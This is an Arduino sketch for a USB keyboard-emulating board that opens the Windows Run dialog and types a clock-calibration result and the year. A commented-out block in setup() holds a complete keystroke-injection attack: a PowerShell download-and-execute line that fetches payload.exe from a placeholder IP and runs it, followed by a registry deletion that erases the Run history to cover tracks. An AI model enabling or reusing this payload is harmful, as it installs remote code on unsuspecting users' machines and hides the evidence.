#include <Arduino.h>
#include "DigiKeyboard.h"
#include <avr/boot.h>

#include <TinyWireM.h>
#include "TinyRTClib.h"

RTC_Millis RTC;


int blinkPin = 1;

byte read_factory_calibration(void) {
  byte SIGRD = 5; // for some reason this isn't defined...
  byte value = boot_signature_byte_get(1);
  return value;
}

boolean is_clock_calibrated(void) {
  return read_factory_calibration() != OSCCAL;
}

void setup() {
  pinMode(blinkPin, OUTPUT);
  digitalWrite(blinkPin, HIGH);
  DigiKeyboard.delay(500);
  digitalWrite(blinkPin, LOW);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("echo is_clock_calibrated => ");
  DigiKeyboard.delay(100);
  char output [10];
  sprintf(output,"%s",is_clock_calibrated() ? "true":"false");
  DigiKeyboard.println(output);
  DigiKeyboard.delay(100);
  RTC.begin(DateTime(__DATE__, __TIME__));
  delay(100);
  DateTime now = RTC.now();
  DigiKeyboard.print(now.year(), DEC);
  DigiKeyboard.delay(100);
  // DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // DigiKeyboard.delay(1000);
  // DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  // DigiKeyboard.delay(1000);
  // // Modify 127.0.0.1 with your IP address and payload.exe with your payload file name
  // DigiKeyboard.println("$down = New-Object System.Net.WebClient; $url = 'http://127.0.0.1/payload.exe'; $file = 'payload.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
  // DigiKeyboard.delay(1000);
  // DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  // DigiKeyboard.delay(100);
  // // Clear run command history
  // DigiKeyboard.println("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f");
  // DigiKeyboard.delay(100);
  // DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // DigiKeyboard.delay(100);
  digitalWrite(blinkPin, HIGH);
  delay(1000);
}

void loop()
{
  digitalWrite(blinkPin, HIGH);
  delay(100);
  digitalWrite(blinkPin, LOW);
  delay(100);
}
